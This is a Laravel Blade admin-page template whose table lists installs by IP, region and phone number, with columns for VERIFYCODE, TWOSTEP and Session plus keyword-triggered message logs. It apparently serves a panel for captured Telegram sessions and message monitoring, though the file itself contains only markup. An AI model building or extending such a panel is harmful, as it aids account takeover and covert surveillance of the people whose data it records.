@extends('layouts.main')
@section('content')
<section role="main" class="content-body">
    <header class="page-header">
        <h2>{{ $pageName }}</h2>
    </header>
    <!--start content  -->

    <div class="panel-body">
        <div style="display:flex;margin-bottom:20px;">
            <input type="text" class="form-control logid" style="display:none">
            <span style="display: flex;align-items: center;">触发时间 :</span>
            <div class="col-lg-4">                
                <div class="input-group">
                    <span class="input-group-addon">
                        <i class="fa fa-calendar"></i>
                    </span>
                    <!-- <input type="text" data-plugin-datepicker class="form-control install-date"> -->
                    <input type="date"  class="form-control install-date">
                </div>
            </div>            
            <span style="display: flex;align-items: center;">手机号码 :</span>
            <div class="col-lg-4">
                <input type="text" class="form-control tg-phone">
            </div>
            {{-- <button type="submit" class="btn btn-primary hidden-xs btn-search">Search</button> --}}
        </div>
        <div style="display:flex;margin-bottom:20px;">            
            <span style="display: flex;align-items: center;">备注 :</span>    
            <div class="col-lg-4">
                <input type="text" class="form-control tg-note">
            </div>
            
            <span style="display: flex;align-items: center;">触发关键词 :</span>    
            <div class="col-lg-4">
                <input type="text" class="form-control trigger-keyword">
            </div>

        </div>            
        <div style="display:flex;margin-bottom:20px;">           
            <button type="submit" class="btn btn-primary btn-search" style="margin-right:20px">搜索</button>
            <button type="submit" class="btn btn-primary btn-global-search" style="margin-right:20px">全局搜索</button>
            <button type="submit" class="btn btn-success btn-select-all" style="margin-right:20px">全选</button>
            <button type="submit" class="btn btn-danger  btn-delete-sel" style="margin-right:20px">删除选择</button>
            <button type="submit" class="btn btn-danger plain  btn-all-triggers" style="margin-right:0px">全局触发窗口</button>
        </div>
       <table id="users-table" class="table table-striped dt-responsive" style="table-layout:fixed;white-space: pre-wrap;word-break: break-word;" cellspacing="0" width="100%" data-click-to-select="true">
            <thead>
                <tr>
                    <th width="30px">选择</th>
                    <th width="30px">编号</th>
                    <th width="100px">安装时间</th>
                    <th width="100px">用户IP地址</th>
                    <th width="100px">地区</th>
                    {{-- <th width="100px">地区</th> --}}
                    <th width="100px">手机号码</th>
                    <th width="100px">触发时间</th>
                    <th width="300px">关键词语句</th>
                    <th width="80px">触发关键词</th>
                    <th width="100px">VERIFYCODE</th>
                    <th width="100px">TWOSTEP</th>
                    <th width="80px">Session</th>
                    <th width="50px">断开</th>
                    <th width="100px">延迟</th>
                    <th width="50px">备注</th>
                    <th width="50px">编辑</th>
                    <th width="50px">删除</th>
                </tr>
            </thead>
        </table>
    </div>
<!--end content  -->
</section>
<!-- modal -->
<div class="modal fade" id="keywords" role="dialog">
    <div class="modal-dialog modal-lg">  
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header bg-primary">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title add-submenu-title text-center">
            {{"Keywords"}}
          </h4>
        </div>
        <div class="modal-body add-submenu-content">
            <table id="keywords-table" class="display" cellspacing="0" width="100%">
                <thead>
                    <tr>
                        <th>编号</th>
                        <th width="20%">触发时间</th>
                        <th>发送关键词语句</th>
                        <th>接受关键词语句</th>
                        <th>用户id</th>
                        <th>用户群组id</th>
                        <th>屏蔽关键词</th>
                    </tr>
                </thead>
            </table>
        </div>
    </div>
</div>
@endsection
@section('script')
<script type="text/javascript" src="{{ asset('assets/js/marklogs.js') }}"></script>
{{-- <script type="text/javascript" src="{{ asset('assets/js/keywords.js') }}"></script> --}}
@endsection
